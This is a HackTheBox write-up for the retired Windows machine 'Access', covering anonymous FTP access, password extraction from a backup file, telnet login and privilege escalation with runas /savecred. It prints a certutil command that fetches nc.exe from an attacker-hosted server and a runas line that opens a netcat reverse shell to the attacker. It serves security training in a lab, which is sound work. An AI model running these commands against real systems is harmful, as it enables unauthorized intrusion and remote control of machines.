---
title: Access Hackthebox Writeup
date: 2020-12-21 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [windows,ftp,ftp anonymous,runas,telnet,password finding]     # TAG names should always be lowercase
image: /assets/img/access-hackthebox/access-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Access:~$


Column | Details
------------ | -------------
Name | Access
IP | 10.10.10.98
Points | 20
Os | Windows
Difficult | Easy
Creator | [egre55](https://www.hackthebox.eu/home/users/profile/1190)
Out on | 29th September 2018

# Summary:~$

* Discovering the new host and scanning for open ports.
* `Anonymous` loging into the ftp port.
* Downloading the files in both of the directories via `ftp`.
* Extracting the password from `backup.mdb` to open `Access Control.zip` file.
* Loging in with the `credentials` found for telnet and getting user flag.
* Exploiting `runas` command to get the Root Privileges on the machine.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/access-hackthebox/nmap-scan-1.png)

Basically `3` Ports are open i.e. `21,23,80`. Let's access `Port 80` first.

___
![](/assets/img/access-hackthebox/port-80-page-5.png)

I moved around a bit and even tried dirbuster on it, but found nothing interesting.

Now let's try to log into the `ftp` port as `anonymous` user.

**Username**: `anonymous` and **Password**: `anonymous`

___
![](/assets/img/access-hackthebox/loggedin-anonymous-ftp-2.png)

It shows two directories i.e. `Backups` and `Engineer`.

Downloading `backup.mdb` from **Backups** directory.

___
![](/assets/img/access-hackthebox/downloaded-backup-from-Backups-3.png)

Downloading `Access Control.zip` from **Engineer** directory.

___
![](/assets/img/access-hackthebox/downloaded-access-control-from-engineer-4.png)

I tried opening `Access Control.zip` but it requires a password.

___
![](/assets/img/access-hackthebox/access-control-password-6.png)

I assumed that we might find the `password` for *Access Control.zip* in `backup.mdb`, I directly ran the `strings` command on *backup.mdb* and found this:

___
![](/assets/img/access-hackthebox/access-password-strings-backup-mdb-7.png)

**Password**: `access4u@security`.

After accessing `Access Control.zip` it showed me a *.pst* file, which I opened on an online mail viewer.

___
![](/assets/img/access-hackthebox/pst-file-email-password-8.png)

It gave us some credentials, accessing telnet with it.

**Username**: `security` and **Password**: `4Cc3ssC0ntr0ller`.

Loggedin telnet successfully and got `User Flag`.

___
![](/assets/img/access-hackthebox/got-telnet-shell-9.png)

For `Privilege Escalation`, I found a file in **C:\Users\Public\Desktop** with a name called *ZKAccess3.5 Security System.lnk*

___
![](/assets/img/access-hackthebox/users-public-desktop-file-10.png)

Using `type` command to get the contents of the file.

___
![](/assets/img/access-hackthebox/run-as-command-in-file-11.png)

After seeing `runas` command with **Administrator** mentioned in it (*runas command is being excuted as administrator*), I checked the permissions for administrator first.

___
![](/assets/img/access-hackthebox/no-password-required-for-admin-12.png)

As we can see that `Password required` is set to **No**, Let's try to escalate privileges using `runas` command. Before that transfering `nc.exe` to the machine using `certutil` command.

**Command**: `certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe`

*Make sure you are hosting nc.exe using python server. **Commamd** : `sudo python3 -m http.server 80`*

___
![](/assets/img/access-hackthebox/downloaded-nc-on-windows-machine-13.png)

Now using `runas` command to escalate privileges,  **runas** allows us to run commands as another user and the option /savecred allows us to use the command without asking for password.

[runas commands](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas)

**Command**: `runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.X.X LPORT"`

___
![](/assets/img/access-hackthebox/runas-command-got-root-shell-14.png)

Got `Root`.

